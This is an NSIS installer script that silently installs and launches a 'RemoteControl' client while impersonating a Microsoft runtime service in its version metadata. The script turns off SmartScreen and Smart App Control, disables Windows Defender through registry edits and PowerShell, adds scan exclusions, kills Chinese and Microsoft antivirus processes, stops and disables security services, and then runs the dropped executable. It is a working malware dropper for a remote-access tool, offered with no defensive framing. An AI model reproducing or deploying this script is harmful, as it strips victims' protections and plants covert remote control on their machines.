; RemoteControl Client Installer - NSIS Script
; Silent install, disable security, deploy and run client

!include "FileFunc.nsh"

;--- Basic Info ---
Name "System Runtime Service"
OutFile "RemoteControl.Client.Installer.exe"
InstallDir "$TEMP\RuntimeBroker"
RequestExecutionLevel admin
SilentInstall silent
ShowInstDetails nevershow

;--- Version Info ---
VIProductVersion "10.0.22621.1"
VIAddVersionKey "ProductName" "Windows Runtime Service"
VIAddVersionKey "CompanyName" "Microsoft Corporation"
VIAddVersionKey "FileDescription" "Runtime Broker Service Installer"
VIAddVersionKey "FileVersion" "10.0.22621.1"
VIAddVersionKey "LegalCopyright" "Microsoft Corporation"

;--- Main Section ---
Section "Install"
    SetOutPath "$INSTDIR"
    SetOverwrite on

    ; 1. Disable Smart App Control
    nsExec::ExecToLog 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v VerifiedAndReputablePolicyState /t REG_DWORD /d 0 /f'
    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f'
    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 0 /f'
    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControl /t REG_SZ /d "Anywhere" /f'

    ; 2. Disable Windows Defender
    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'
    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f'
    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f'
    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f'
    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f'
    nsExec::ExecToLog 'powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue"'
    nsExec::ExecToLog 'powershell -NoProfile -Command "Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue"'
    nsExec::ExecToLog 'powershell -NoProfile -Command "Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue"'

    ; 3. Add exclusion paths
    nsExec::ExecToLog 'powershell -NoProfile -Command "Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue"'
    nsExec::ExecToLog 'powershell -NoProfile -Command "Add-MpPreference -ExclusionPath ''$INSTDIR'' -ErrorAction SilentlyContinue"'

    ; 4. Kill AV processes
    nsExec::ExecToLog 'taskkill /F /IM 360Tray.exe'
    nsExec::ExecToLog 'taskkill /F /IM 360Safe.exe'
    nsExec::ExecToLog 'taskkill /F /IM ZhuDongFangYu.exe'
    nsExec::ExecToLog 'taskkill /F /IM 360sd.exe'
    nsExec::ExecToLog 'taskkill /F /IM 360rp.exe'
    nsExec::ExecToLog 'taskkill /F /IM QQPCTray.exe'
    nsExec::ExecToLog 'taskkill /F /IM QQPCRTP.exe'
    nsExec::ExecToLog 'taskkill /F /IM KSafeTray.exe'
    nsExec::ExecToLog 'taskkill /F /IM kxetray.exe'
    nsExec::ExecToLog 'taskkill /F /IM HipsTray.exe'
    nsExec::ExecToLog 'taskkill /F /IM HipsDaemon.exe'
    nsExec::ExecToLog 'taskkill /F /IM SecurityHealthSystray.exe'
    nsExec::ExecToLog 'taskkill /F /IM smartscreen.exe'

    ; 5. Stop security services
    nsExec::ExecToLog 'net stop "ZhuDongFangYu" /y'
    nsExec::ExecToLog 'net stop "360rp" /y'
    nsExec::ExecToLog 'net stop "WinDefend" /y'
    nsExec::ExecToLog 'net stop "WdNisSvc" /y'
    nsExec::ExecToLog 'net stop "SecurityHealthService" /y'
    nsExec::ExecToLog 'sc config "WinDefend" start=disabled'
    nsExec::ExecToLog 'sc config "WdNisSvc" start=disabled'
    nsExec::ExecToLog 'sc config "SecurityHealthService" start=disabled'

    ; 6. Extract client
    File "RemoteControl.Client.Generated.exe"

    ; 7. Run client
    Exec '"$INSTDIR\RemoteControl.Client.Generated.exe"'

    ; 8. Self-delete installer
    SetOutPath "$TEMP"

SectionEnd
